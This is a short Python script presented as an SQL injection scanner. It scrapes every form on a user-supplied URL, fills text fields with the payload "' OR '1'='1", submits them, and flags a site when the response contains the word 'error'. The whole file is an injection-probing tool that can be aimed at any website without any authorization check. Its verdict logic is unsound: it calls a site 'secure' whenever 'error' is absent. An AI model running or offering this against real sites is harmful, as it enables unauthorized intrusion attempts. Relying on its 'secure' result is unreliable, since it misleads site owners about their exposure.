import requests
from bs4 import BeautifulSoup
import urllib.parse

def sql_injection_scanner(url):
    # send HTTP request to the provided URL and save the response from server in a response object called r
    r = requests.get(url)

    # create a BeautifulSoup object
    soup = BeautifulSoup(r.text, 'html.parser')
    
    # find all form tags on the webpage
    forms = soup.find_all('form')

    # return a message if no form is found
    if len(forms) == 0:
        return "No form found on the webpage."

    for form in forms:
        action = form.get('action')
        method = form.get('method')

        inputs = form.find_all('input')
        post_data = {}

        for input in inputs:
            input_name = input.get('name')
            input_type = input.get('type')
            input_value = input.get('value')

            if input_type == 'text':
                input_value = "' OR '1'='1"

            post_data[input_name] = input_value

        target_url = urllib.parse.urljoin(url, action)
        if method == 'post':
            r = requests.post(target_url, data=post_data)
        elif method == 'get':
            r = requests.get(target_url, params=post_data)

        # if response HTML contains the word 'error' in it, the website might be SQL injection vulnerable
        if 'error' in r.text:
            return f"[!] The website {url} might be vulnerable to SQL Injection."
        
    return f"[+] The website {url} is secure."

url = input("Enter the URL to scan: ")
print(sql_injection_scanner(url))
